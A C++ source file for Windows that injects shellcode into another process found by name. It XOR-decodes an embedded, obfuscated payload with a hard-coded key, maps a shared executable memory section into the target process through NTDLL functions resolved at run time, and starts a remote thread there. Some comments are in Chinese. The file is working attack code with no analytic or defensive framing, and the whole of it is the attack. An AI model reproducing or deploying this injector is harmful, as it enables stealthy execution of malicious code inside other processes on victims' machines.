#include <iostream>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "advapi32.lib") 

#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING {
    USHORT            Length;
    USHORT            MaximumLength;
    PWSTR             Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
    ULONG            Length;
    HANDLE           RootDirectory;
    PUNICODE_STRING  ObjectName;
    ULONG            Attributes;
    PVOID            SecurityDescriptor;
    PVOID            SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID {
    PVOID            UniqueProcess;
    PVOID            UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


// NtCreateSection syntax
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE            SectionHandle,
    IN ULONG               DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER      MaximumSize OPTIONAL,
    IN ULONG               PageAttributess,
    IN ULONG               SectionAttributes,
    IN HANDLE              FileHandle OPTIONAL
    );

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE            SectionHandle,
    HANDLE            ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR         ZeroBits,
    SIZE_T            CommitSize,
    PLARGE_INTEGER    SectionOffset,
    PSIZE_T           ViewSize,
    DWORD             InheritDisposition,
    ULONG             AllocationType,
    ULONG             Win32Protect
    );

// RtlCreateUserThread syntax
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
    IN HANDLE               ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN              CreateSuspended,
    IN ULONG                StackZeroBits,
    IN OUT PULONG           StackReserved,
    IN OUT PULONG           StackCommit,
    IN PVOID                StartAddress,
    IN PVOID                StartParameter OPTIONAL,
    OUT PHANDLE             ThreadHandle,
    OUT PCLIENT_ID          ClientID
    );

// NtOpenProcess syntax
typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE                 ProcessHandle,
    ACCESS_MASK             AccessMask,
    POBJECT_ATTRIBUTES      ObjectAttributes,
    PCLIENT_ID              ClientID
    );

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
    HANDLE                 ProcessHandle,
    PVOID BaseAddress
    );

// 由文件名找对应进程id
int findMyProc(const char* procname) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;
  
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32);

    hResult = Process32First(hSnapshot, &pe);

    while (hResult) {
        if (strcmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }
  
    CloseHandle(hSnapshot);
    return pid;
}

unsigned char my_payload[] = { 0x91, 0x31, 0xf0, 0x91, 0x80, 0x8d, 0xb2, 0x73, 0x65, 0x63, 0x33, 0x34, 0x35, 0x3b, 0x37, 0x28, 0x3b, 0x31, 0x42, 0xa7, 0x15, 0x2d, 0xf9, 0x21, 0x5, 0x2b, 0xf9, 0x37, 0x6c, 0x23, 0xee, 0x2b, 0x4d, 0x31, 0xf8, 0x7, 0x20, 0x2d, 0x7d, 0xc4, 0x2f, 0x29, 0x3f, 0x54, 0xbd, 0x23, 0x54, 0xb9, 0xc1, 0x45, 0x12, 0x9, 0x72, 0x49, 0x52, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x87, 0x94, 0x3f, 0x38, 0x22, 0x3d, 0xfb, 0x37, 0x52, 0xf8, 0x27, 0x5f, 0x3a, 0x64, 0xa4, 0xe0, 0xe5, 0xf1, 0x6d, 0x79, 0x73, 0x3d, 0xf5, 0xa5, 0x6, 0x14, 0x2d, 0x62, 0xa2, 0x35, 0xff, 0x23, 0x7d, 0x3d, 0xe6, 0x39, 0x53, 0x3c, 0x71, 0xb5, 0x91, 0x25, 0x2d, 0x9c, 0xbb, 0x24, 0xff, 0x5f, 0xed, 0x31, 0x6c, 0xaf, 0x3e, 0x44, 0xb9, 0x2d, 0x43, 0xb3, 0xc9, 0x22, 0xb3, 0xac, 0x79, 0x2a, 0x64, 0xb8, 0x55, 0x99, 0x6, 0x84, 0x3c, 0x66, 0x3e, 0x57, 0x6d, 0x26, 0x4b, 0xb4, 0x1, 0xb3, 0x3d, 0x3d, 0xe6, 0x39, 0x57, 0x3c, 0x71, 0xb5, 0x14, 0x32, 0xee, 0x6f, 0x3a, 0x21, 0xff, 0x2b, 0x79, 0x30, 0x6c, 0xa9, 0x32, 0xfe, 0x74, 0xed, 0x3a, 0x72, 0xb5, 0x22, 0x2a, 0x24, 0x2c, 0x35, 0x3c, 0x23, 0x2c, 0x21, 0x32, 0x2c, 0x31, 0x3f, 0x3a, 0xf0, 0x89, 0x43, 0x33, 0x37, 0x8b, 0x8b, 0x3d, 0x38, 0x34, 0x23, 0x3b, 0xfe, 0x62, 0x8c, 0x25, 0x8c, 0x9a, 0x9c, 0x2f, 0x2d, 0xce, 0x6a, 0x65, 0x79, 0x6d, 0x79, 0x73, 0x75, 0x70, 0x2d, 0xff, 0xfe, 0x64, 0x62, 0x72, 0x65, 0x35, 0xd1, 0x54, 0xf2, 0x2, 0xfe, 0x8c, 0xa0, 0xcb, 0x95, 0xc7, 0xd1, 0x33, 0x22, 0xc8, 0xc3, 0xe1, 0xd6, 0xf8, 0x86, 0xb8, 0x31, 0xf0, 0xb1, 0x58, 0x59, 0x74, 0xf, 0x6f, 0xe3, 0x89, 0x85, 0x1, 0x6e, 0xde, 0x3e, 0x7e, 0xb, 0x1c, 0x1f, 0x70, 0x3c, 0x33, 0xfa, 0xbf, 0x9c, 0xa7, 0x6, 0x15, 0x7, 0x6, 0x57, 0x8, 0x1, 0x16, 0x75 };
unsigned int my_payload_len = sizeof(my_payload);

char my_secret_key[] = "mysupersecretkey";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main(int argc, char* argv[]) {
  
    XOR((char*)my_payload, my_payload_len, my_secret_key, sizeof(my_secret_key));


    SIZE_T s = 4096;
    LARGE_INTEGER sectionS = { s };
    HANDLE sh = NULL; // section handle
    PVOID lb = NULL; // local buffer
    PVOID rb = NULL; // remote buffer
    HANDLE th = NULL; // thread handle
    DWORD pid; // process ID

    pid = findMyProc(argv[1]);

    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = (PVOID)pid;
    cid.UniqueThread = 0;

    // loading ntdll.dll
    HANDLE ntdll = GetModuleHandleA("ntdll");

    pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress((HMODULE)ntdll, "NtOpenProcess");
    pNtCreateSection myNtCreateSection = (pNtCreateSection)(GetProcAddress((HMODULE)ntdll, "NtCreateSection"));
    pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress((HMODULE)ntdll, "NtMapViewOfSection"));
    pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress((HMODULE)ntdll, "RtlCreateUserThread"));
    pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress((HMODULE)ntdll, "ZwUnmapViewOfSection"));

    // 创建一个新的内存映射文件对象返回句柄
    myNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // 内存映射到当前进程
    myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_READWRITE);

    // 打开目标进程
    HANDLE ph = NULL;
    myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid);

    if (!ph) {
        printf("failed to open process :(\n");
        return -2;
    }

    // 内存映射到目标进程
    myNtMapViewOfSection(sh, ph, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READ);

    // 写入shellcode
    memcpy(lb, my_payload, sizeof(my_payload));

    myRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, rb, NULL, &th, NULL);

    if (WaitForSingleObject(th, INFINITE) == WAIT_FAILED) {
        return -2;
    }

    // 清除内存映射
    myZwUnmapViewOfSection(GetCurrentProcess(), lb);
    myZwUnmapViewOfSection(ph, rb);
    CloseHandle(sh);
    CloseHandle(ph);
    return 0;
}
